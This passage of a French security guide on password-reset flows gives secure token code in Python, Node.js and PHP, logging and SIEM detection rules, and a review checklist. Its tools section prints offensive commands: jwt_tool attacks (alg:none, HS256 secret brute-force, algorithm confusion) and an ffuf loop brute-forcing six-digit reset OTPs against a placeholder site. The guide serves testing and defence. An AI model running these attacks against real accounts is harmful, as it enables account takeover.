# Python / Flask — flux complet sécurisé de génération et validation du jeton
import secrets
import hashlib
from datetime import datetime, timedelta, timezone

TOKEN_TTL_MINUTES = 15
RESET_BASE_URL = "https://cible.com"  # domaine fixé en dur, jamais dérivé du header Host

def generate_reset_token(user_id: str) -> str:
    # CSPRNG : source cryptographiquement sûre, 32 octets = 256 bits d'entropie
    raw_token = secrets.token_hex(32)

    # Seul le HASH du jeton est stocké côté serveur, jamais le jeton en clair
    token_hash = hashlib.sha256(raw_token.encode()).hexdigest()
    expires_at = datetime.now(timezone.utc) + timedelta(minutes=TOKEN_TTL_MINUTES)

    db.session.execute(
        """
        INSERT INTO password_reset_tokens (user_id, token_hash, expires_at, used)
        VALUES (:user_id, :token_hash, :expires_at, false)
        """,
        {"user_id": user_id, "token_hash": token_hash, "expires_at": expires_at},
    )
    db.session.commit()

    # Le jeton EN CLAIR n'est retourné qu'au canal hors-bande (email),
    # jamais dans la réponse HTTP de la requête de demande.
    return f"{RESET_BASE_URL}/reset?token={raw_token}"


def validate_and_consume_token(raw_token: str, new_password: str) -> bool:
    token_hash = hashlib.sha256(raw_token.encode()).hexdigest()

    record = db.session.execute(
        """
        SELECT user_id, expires_at, used FROM password_reset_tokens
        WHERE token_hash = :token_hash
        """,
        {"token_hash": token_hash},
    ).fetchone()

    if record is None or record.used or record.expires_at < datetime.now(timezone.utc):
        # Message générique : ne distingue jamais "expiré" de "invalide" de "déjà utilisé"
        return False

    # Usage unique : invalidation immédiate avant même de traiter le changement
    db.session.execute(
        "UPDATE password_reset_tokens SET used = true WHERE token_hash = :token_hash",
        {"token_hash": token_hash},
    )

    update_user_password(record.user_id, new_password)
    invalidate_all_active_sessions(record.user_id)
    db.session.commit()
    return True
```

```javascript
// Node.js / Express — endpoint de demande, réponse strictement générique
const crypto = require("crypto");

const RESET_BASE_URL = "https://cible.com"; // jamais dérivé de req.headers.host

app.post("/api/v1/forgot-password", rateLimiter, async (req, res) => {
  const { email } = req.body;
  const user = await User.findByEmail(email);

  if (user) {
    const rawToken = crypto.randomBytes(32).toString("hex"); // CSPRNG, 256 bits
    const tokenHash = crypto.createHash("sha256").update(rawToken).digest("hex");

    await PasswordResetToken.create({
      userId: user.id,
      tokenHash,
      expiresAt: new Date(Date.now() + 15 * 60 * 1000),
      used: false,
    });

    await sendResetEmail(user.email, `${RESET_BASE_URL}/reset?token=${rawToken}`);
  }

  // Réponse strictement identique, que le compte existe ou non, et sans jamais
  // inclure le token ni aucune donnée dérivée dans le corps de la réponse.
  return res.status(200).json({ message: "If this account exists, a reset link has been sent." });
});
```

```php
<?php
// PHP — génération sécurisée et stockage haché, exemple minimal
function generateResetToken(int $userId, PDO $pdo): string {
    $rawToken = bin2hex(random_bytes(32)); // CSPRNG natif PHP, 256 bits d'entropie
    $tokenHash = hash('sha256', $rawToken);
    $expiresAt = (new DateTime('+15 minutes'))->format('Y-m-d H:i:s');

    $stmt = $pdo->prepare(
        "INSERT INTO password_reset_tokens (user_id, token_hash, expires_at, used)
         VALUES (:user_id, :token_hash, :expires_at, 0)"
    );
    $stmt->execute([
        ':user_id' => $userId,
        ':token_hash' => $tokenHash,
        ':expires_at' => $expiresAt,
    ]);

    // Domaine de base fixé en dur en configuration, jamais lu depuis $_SERVER['HTTP_HOST']
    $baseUrl = getenv('APP_RESET_BASE_URL'); // ex : https://cible.com
    return "{$baseUrl}/reset?token={$rawToken}";
}
?>
```

### Logging sécurisé et surveillance (apport Blue Team)

Un flux de réinitialisation correctement implémenté doit non seulement être robuste à l'exploitation, mais également **observable** pour permettre la détection d'attaques en cours ou rétrospectives.

**Ce qu'il faut journaliser (sans exposer les valeurs sensibles) :**

```python
# Modèle d'événement de log structuré pour les actions du flux de reset
# Utiliser un format JSON structuré pour l'ingestion SIEM (Splunk, Elastic, Datadog)

import logging, json
from datetime import datetime, timezone

security_logger = logging.getLogger("security.password_reset")

def log_reset_event(event_type: str, user_id: str, ip: str, success: bool, detail: str = "") -> None:
    """
    event_type : "reset_requested" | "token_validated" | "token_rejected" |
                 "password_changed" | "token_expired" | "brute_force_suspected"
    IMPORTANT  : ne jamais inclure le token (ni son hash) dans les logs applicatifs.
                 Loguer uniquement les métadonnées nécessaires à la détection.
    """
    security_logger.info(json.dumps({
        "timestamp":  datetime.now(timezone.utc).isoformat(),
        "event":      event_type,
        "user_id":    user_id,        # identifiant interne, non l'email
        "source_ip":  ip,
        "success":    success,
        "detail":     detail,
        # "token":   JAMAIS — le token ne doit jamais apparaître dans les logs
    }))
```

**Alertes SIEM recommandées :**

| Règle de détection | Seuil indicatif | Gravité |
|---|---|---|
| Volume élevé de demandes de reset sur un même compte | > 5 en 1 heure | Haute |
| Volume élevé de demandes de reset depuis une même IP | > 20 en 10 minutes | Haute |
| Taux élevé de rejets de token (brute-force OTP) | > 10 tentatives échouées par compte en 5 min | Critique |
| Demande de reset depuis une IP de ToR/proxy connu | Toute occurrence | Moyenne |
| Changement de mot de passe suivi immédiatement d'une connexion depuis un nouveau pays | Δ pays ≥ 1 dans la même heure | Haute |
| Utilisation d'un token de reset depuis une IP différente de celle de la demande | Toute occurrence (selon tolérance métier) | Moyenne |

```yaml
# Exemple de règle Sigma pour détecter un brute-force d'OTP (SIEM compatible)
title: Password Reset OTP Brute-Force Attempt
status: stable
description: Détecte un volume anormal de rejets de token sur un même compte en fenêtre glissante
logsource:
    product: application
    service: security.password_reset
detection:
    selection:
        event: "token_rejected"
        success: false
    timeframe: 5m
    condition: selection | count(user_id) by user_id > 10
falsepositives:
    - Utilisateur légitime ayant reçu plusieurs emails de reset et testant différents liens
level: high
tags:
    - attack.credential_access
    - attack.t1110.001
```

**Ce qu'il ne faut JAMAIS journaliser :**

- Le token de réinitialisation en clair ou son hash
- Le nouveau mot de passe soumis (même partiellement)
- L'URL complète incluant le token en paramètre GET (configurer le masquage dans la configuration du logger)

```nginx
# Nginx — masquage du paramètre token dans les logs d'accès
# Remplacer la valeur du paramètre "token" par "[REDACTED]" dans les logs
log_format reset_safe '$remote_addr - $remote_user [$time_local] '
                      '"$request_method $uri_without_token $server_protocol" '
                      '$status $body_bytes_sent';

# Ou plus simplement : ne pas journaliser les query strings sur les routes de reset
map $uri $loggable {
    ~^/reset  0;  # supprimer les logs d'accès pour /reset/* (le token serait en clair)
    default   1;
}
access_log /var/log/nginx/access.log combined if=$loggable;
```

!!! tip "Checklist de revue rapide"
    - [ ] Le jeton est-il généré par un CSPRNG, avec au moins 128 bits d'entropie ?
    - [ ] Seul le hash du jeton est-il stocké en base ?
    - [ ] Le jeton expire-t-il en 15 minutes ou moins, et est-il à usage unique ?
    - [ ] La réponse HTTP à la demande de reset est-elle strictement générique, sans jamais exposer le token ?
    - [ ] `Referrer-Policy: no-referrer` est-elle appliquée sur la page de réinitialisation ?
    - [ ] Le domaine utilisé dans le lien envoyé par email est-il fixé en configuration, sans dépendre du header `Host` ?
    - [ ] Un rate-limiting par IP **et** par compte protège-t-il la demande comme la soumission ?
    - [ ] Toutes les sessions actives sont-elles invalidées après un changement de mot de passe réussi ?
    - [ ] Les tokens en cours sont-ils révoqués lors d'un changement d'email ou d'état du compte ?
    - [ ] Le token est-il absent des logs serveur, CDN et des outils d'analytics tiers ?
    - [ ] La comparaison de token se fait-elle avec `hash_equals()` (comparaison en temps constant) ?
    - [ ] Si JWT : l'algorithme attendu est-il validé côté serveur ? Le secret HS256 est-il suffisamment long et aléatoire ?
    - [ ] Des alertes SIEM sont-elles configurées pour détecter les tentatives de brute-force et les anomalies de volume ?

---

## 6. Outils & ressources recommandées

### Outils d'analyse et d'exploitation (Red Team)

| Outil | Usage dans le contexte password reset |
|---|---|
| **Burp Suite Pro** — Intruder | Brute-force d'OTP à 4/6 chiffres avec gestion du rate-limiting et des codes de réponse différentiels |
| **Burp Suite** — Repeater | Manipulation manuelle des requêtes : suppression du token, substitution de `user_id`, test des variantes de paramètres |
| **Burp Suite** — Logger / HTTP History | Inspection de toutes les requêtes générées lors du clic sur le lien de reset (détection Referer Leakage) |
| **ffuf** | Fuzzing des paramètres et des valeurs de token sur les endpoints de validation |
| **jwt_tool** | Analyse, modification et test des JWT (alg:none, confusion RS256/HS256, brute-force secret) |
| **hashcat** (mode 16500) | Brute-force hors ligne du secret HS256 à partir d'un JWT intercepté |
| **Python `requests`** | Automatisation des scénarios de brute-force OTP et de génération de tokens prédictibles |
| **`entropy`** (tool CLI) ou script Shannon | Évaluation quantitative de l'entropie d'un échantillon de tokens collectés |

```bash
# Installation de jwt_tool (analyse et exploitation JWT)
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# Test alg:none sur un JWT de reset intercepté
python3 jwt_tool.py TOKEN_JWT -X a

# Brute-force du secret HS256 avec une wordlist
python3 jwt_tool.py TOKEN_JWT -C -d /usr/share/wordlists/rockyou.txt

# Test de confusion d'algorithme RS256 → HS256 avec la clé publique récupérée
python3 jwt_tool.py TOKEN_JWT -X k -pk public_key.pem
```

```bash
# ffuf — fuzzing du paramètre OTP sur l'endpoint de confirmation
# FUZZ sera remplacé par les valeurs du wordlist (liste de 000000 à 999999)
seq -w 0 999999 > otp_wordlist.txt

ffuf -u https://cible.com/api/v1/reset-password/confirm \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email":"victime@mail.com","otp":"FUZZ"}' \
     -w otp_wordlist.txt \
     -mc 200 \
     -t 10        # threads — ajuster selon le comportement du rate-limiter cible
```

### Ressources de référence

!!! note "Documentation et standards"
    - **OWASP Testing Guide v4.2** — [OTG-AUTHN-009 : Testing for Weak Password Change or Reset Functionalities](https://owasp.org/www-project-web-security-testing-guide/)
    - **OWASP Cheat Sheet Series** — [Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
    - **OWASP Cheat Sheet Series** — [JSON Web Token Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
    - **PortSwigger Web Security Academy** — [Password Reset Poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)
    - **PortSwigger Web Security Academy** — [JWT Attacks](https://portswigger.net/web-security/jwt)
    - **NIST SP 800-63B** — Section 5.1.1.2 (Memorized Secret Authenticators — Reset) : exigences formelles sur la génération et la transmission des secrets de recouvrement
    - **RFC 6749** — Bonnes pratiques sur la durée de vie et l'usage unique des tokens dans les flux OAuth (applicables par analogie aux tokens de reset)
    - **CWE-640** — Weak Password Recovery Mechanism for Forgotten Password
    - **CWE-330** — Use of Insufficiently Random Values
    - **CWE-352** — Cross-Site Request Forgery (CSRF) — applicable à l'étape de confirmation du reset
